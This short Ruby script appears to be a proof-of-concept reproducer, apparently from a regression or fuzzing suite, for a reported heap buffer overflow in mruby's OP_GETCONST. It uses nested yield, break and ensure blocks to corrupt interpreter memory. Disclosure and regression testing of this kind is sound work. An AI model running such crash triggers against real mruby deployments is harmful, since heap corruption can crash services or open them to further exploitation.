# Heap buffer overflow in OP_GETCONST
# Issue: https://github.com/mruby/mruby/issues/3693
# Reported via hackerone

def one
  too { yield }
endbegin;1;rescue => e1;e1;end;

def too
  yield
ensure
  one { break }
end

one